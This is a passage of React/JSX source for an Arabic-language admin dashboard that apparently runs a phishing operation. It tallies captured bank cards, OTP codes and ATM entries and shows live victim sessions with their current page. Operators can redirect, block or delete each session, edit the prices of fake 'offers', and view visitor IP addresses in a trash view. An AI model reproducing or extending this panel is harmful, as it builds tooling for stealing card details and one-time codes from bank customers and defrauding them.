              <div className="mt-1 text-2xl sm:text-3xl font-bold text-slate-900">{stats?.totalSubmissions ?? 0}</div>
            </div>
            <div className="rounded-2xl border border-slate-200 bg-white p-3 text-right col-span-2 sm:col-span-1">
              <div className="flex items-center justify-between text-[10px] sm:text-xs text-slate-500">
                <span>محظور / مهملات</span>
                <Badge className="bg-slate-100 text-slate-700 text-[10px]">{blockedCount}</Badge>
              </div>
              <div className="mt-1 text-2xl sm:text-3xl font-bold text-slate-900">{trashedCount}</div>
            </div>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-6xl px-4 py-6 sm:px-6 lg:px-8 space-y-6">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2 sm:gap-3">
          <StatCard label="البطاقات" value={cardCount} icon={<CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />} color="bg-red-100 text-red-600" />
          <StatCard label="OTP" value={otpCount} icon={<KeyRound className="w-3 h-3 sm:w-4 sm:h-4" />} color="bg-orange-100 text-orange-600" />
          <StatCard label="ATM" value={atmCount} icon={<Banknote className="w-3 h-3 sm:w-4 sm:h-4" />} color="bg-yellow-100 text-yellow-700" />
          <StatCard label="قيد المتابعة" value={pendingCount} icon={<Clock className="w-3 h-3 sm:w-4 sm:h-4" />} color="bg-blue-100 text-blue-600" />
        </div>

        <section className="rounded-3xl border border-slate-200 bg-white p-4">
          <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
            <div className="text-right">
              <h2 className="text-lg font-semibold text-slate-900">الجلسات</h2>
              <p className="text-sm text-slate-500">اختر جلسة للعمل عليها أو حظر مستخدم أو حذف الجلسة.</p>
            </div>
            <div className="flex flex-wrap items-center gap-2 text-xs text-slate-500">
              <span>{sessionCount} جلسة</span>
              <span>|</span>
              <span>{cardCount} بطاقة</span>
              <span>|</span>
              <span>{otpCount} OTP</span>
            </div>
          </div>

          {sessionCount === 0 ? (
            <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-10 text-center text-slate-500">
              لا يوجد جلسات حالياً
            </div>
          ) : (
            <div className="space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-3 text-xs text-slate-500">
                <div className="flex items-center gap-3">
                  <label className="inline-flex items-center gap-2">
                    <input
                      type="checkbox"
                      checked={allSelected}
                      onChange={() => {
                        if (allSelected) setSelectedIds([]);
                        else setSelectedIds(Object.keys(sessions));
                      }}
                      className="h-4 w-4 rounded border-slate-300 text-blue-600"
                    />
                    تحديد الكل
                  </label>
                  <span>{selectedIds.length} محدد</span>
                </div>
                <button
                  type="button"
                  disabled={selectedIds.length === 0}
                  onClick={handleDeleteSelected}
                  className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
                >نقل المحدد إلى المهملات</button>
              </div>
              <div className="space-y-4">
                {Object.entries(sessions).map(([sessionId, rows]) => (
                  <SessionBox
                    key={sessionId}
                    sessionId={sessionId}
                    rows={rows}
                    selected={selectedIds.includes(sessionId)}
                    lastPing={sessionPings[sessionId]?.last_ping}
                    currentPage={sessionPings[sessionId]?.current_page}
                    onToggleSelect={() => {
                      setSelectedIds((current) => current.includes(sessionId)
                        ? current.filter((id) => id !== sessionId)
                        : [...current, sessionId]);
                    }}
                    blocked={blockedMap[sessionId]?.message}
                    onControl={handleControlAction}
                    onBlock={() => handleBlock(sessionId, parseData(rows[0]?.data ?? null).ownerName)}
                    onUnblock={() => handleUnblock(sessionId)}
                    onDelete={() => handleDeleteSession(sessionId)}
                    onOpenHistory={() => setHistoryDialog({ sessionId, rows })}
                    onRedirect={(target) => handleRedirect(sessionId, target)}
                  />
                ))}
              </div>
            </div>
          )}
        </section>
      </main>

      <SessionHistoryDialog
        open={Boolean(historyDialog)}
        rows={historyDialog?.rows ?? []}
        onClose={() => setHistoryDialog(null)}
      />

      <Dialog open={settingsOpen} onOpenChange={setSettingsOpen}>
        <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>إعدادات العروض</DialogTitle>
          </DialogHeader>
          <ScrollArea className="flex-1 mt-4">
            <div className="space-y-4">
              {settings.offers.map((offer, index) => (
                <div key={offer.id} className="rounded-3xl border border-slate-200 bg-white p-4">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <div className="text-sm font-semibold text-slate-900">{offer.name} ({offer.type})</div>
                      <p className="text-xs text-slate-500">السعر الحالي</p>
                    </div>
                    <input
                      type="number"
                      value={offer.price}
                      onChange={(event) => {
                        const nextOffers = [...settings.offers];
                        nextOffers[index] = { ...offer, price: Number(event.target.value) };
                        setSettings({ ...settings, offers: nextOffers });
                      }}
                      className="w-full max-w-[180px] rounded-3xl border border-slate-300 bg-slate-50 px-3 py-2 text-sm text-slate-900"
                    />
                  </div>
                </div>
              ))}
            </div>
          </ScrollArea>
          <div className="mt-4 flex flex-wrap justify-end gap-2">
            <Button size="sm" variant="outline" onClick={() => setSettingsOpen(false)}>إلغاء</Button>
            <Button size="sm" onClick={handleSaveSettings}>حفظ</Button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={passwordOpen} onOpenChange={setPasswordOpen}>
        <DialogContent className="sm:max-w-[480px] max-h-[80vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>تغيير كلمة المرور</DialogTitle>
          </DialogHeader>
          <div className="space-y-4 mt-4">
            <label className="block text-xs font-semibold text-slate-600">كلمة المرور الجديدة</label>
            <input
              type="password"
              value={passwordValue}
              onChange={(event) => setPasswordValue(event.target.value)}
              className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-3 py-2 text-sm"
            />
            {passwordStatus && <div className="text-xs text-slate-500">{passwordStatus}</div>}
            <div className="flex flex-wrap justify-end gap-2">
              <Button size="sm" variant="outline" onClick={() => setPasswordOpen(false)}>إلغاء</Button>
              <Button size="sm" onClick={handleChangePassword}>حفظ</Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={trashOpen} onOpenChange={setTrashOpen}>
        <DialogContent className="sm:max-w-[720px] max-h-[85vh] flex flex-col" dir="rtl">
          <DialogHeader>
            <DialogTitle>سلة المهملات</DialogTitle>
          </DialogHeader>
          <div className="px-4 pb-4">
            <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
              <p className="text-sm text-slate-600">يمكنك استعادة أو حذف العناصر نهائيًا.</p>
              <button
                type="button"
                onClick={handleEmptyTrash}
                className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
              >إفراغ المهملات</button>
            </div>
          </div>
          <ScrollArea className="flex-1 px-4 pb-4">
            {trashItems.length === 0 ? (
              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-8 text-center text-slate-500">لا يوجد عناصر في المهملات</div>
            ) : (
              <div className="space-y-4">
                {trashItems.map((item) => (
                  <div key={`${item.sessionId}-${item.id}`} className="rounded-3xl border border-slate-200 bg-white p-4">
                    <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                      <div className="text-right">
                        <p className="text-sm font-semibold text-slate-900">#{item.sessionId.slice(0, 8)}</p>
                        <p className="text-xs text-slate-500">{item.type} • {formatAgo(item.deletedAt)}</p>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        <button
                          type="button"
                          onClick={() => handleRestoreTrash(item.id)}
                          className="rounded-3xl border border-blue-200 bg-blue-50 px-3 py-2 text-xs text-blue-700 hover:bg-blue-100"
                        >استعادة</button>
                        <button
                          type="button"
                          onClick={() => handleDeleteTrashItem(item.id)}
                          className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700 hover:bg-red-100"
                        >حذف نهائي</button>
                      </div>
                    </div>
                    <div className="mt-3 grid gap-2 sm:grid-cols-2 text-xs text-slate-500">
                      <div>IP: {item.ipAddress ?? "غير معروف"}</div>
                      <div>وقت الحذف: {new Date(item.deletedAt).toLocaleString("ar-EG")}</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </ScrollArea>
          <div className="mt-4 flex justify-end gap-2 px-4 pb-4">
            <Button size="sm" variant="outline" onClick={() => setTrashOpen(false)}>إغلاق</Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
